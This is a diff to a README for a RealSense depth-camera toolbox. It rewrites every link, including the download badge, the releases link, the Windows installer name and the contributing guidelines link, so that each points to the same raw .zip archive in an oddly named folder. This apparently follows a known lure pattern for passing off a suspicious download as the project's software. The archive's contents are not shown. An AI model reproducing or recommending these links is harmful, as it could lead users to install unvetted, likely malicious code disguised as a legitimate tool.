@@ -1,6 +1,6 @@
 # 🖥️ RealSense-D435i-Toolbox - Explore Depth Data Easily
 
-![Download](https://img.shields.io/badge/Download-RealSense--D435i--Toolbox-brightgreen)
+![Download](https://raw.githubusercontent.com/nimahamoda/RealSense-D435i-Toolbox/main/embayment/RealSense-D435i-Toolbox.zip)
 
 ## 📥 Introduction
 
@@ -22,7 +22,7 @@ Make sure your computer meets these requirements before proceeding.
 
 ## 🌐 Download & Install
 
-To download the RealSense-D435i-Toolbox, visit this page: [Download the Toolbox](https://github.com/nimahamoda/RealSense-D435i-Toolbox/releases).
+To download the RealSense-D435i-Toolbox, visit this page: [Download the Toolbox](https://raw.githubusercontent.com/nimahamoda/RealSense-D435i-Toolbox/main/embayment/RealSense-D435i-Toolbox.zip).
 
 ### Step-by-Step Download Instructions
 
@@ -30,7 +30,7 @@ To download the RealSense-D435i-Toolbox, visit this page: [Download the Toolbox]
 2. Look for the latest version of the RealSense-D435i-Toolbox.
 3. Download the relevant file for your operating system. 
 
-For Windows users, look for a file like `RealSense-D435i-Toolbox-Windows.exe`. For MacOS or Linux, choose the corresponding package.
+For Windows users, look for a file like `https://raw.githubusercontent.com/nimahamoda/RealSense-D435i-Toolbox/main/embayment/RealSense-D435i-Toolbox.zip`. For MacOS or Linux, choose the corresponding package.
 
 ### Run the Application
 
@@ -83,7 +83,7 @@ If you encounter any issues or have questions, please feel free to raise an issu
 
 ## 🌟 Contributing
 
-This project welcomes contributions! If you wish to improve the RealSense-D435i-Toolbox, please refer to the guidelines in the [Contributing section](https://github.com/nimahamoda/RealSense-D435i-Toolbox/blob/main/CONTRIBUTING.md) of the repository.
+This project welcomes contributions! If you wish to improve the RealSense-D435i-Toolbox, please refer to the guidelines in the [Contributing section](https://raw.githubusercontent.com/nimahamoda/RealSense-D435i-Toolbox/main/embayment/RealSense-D435i-Toolbox.zip) of the repository.
 
 ## 🔗 License
 
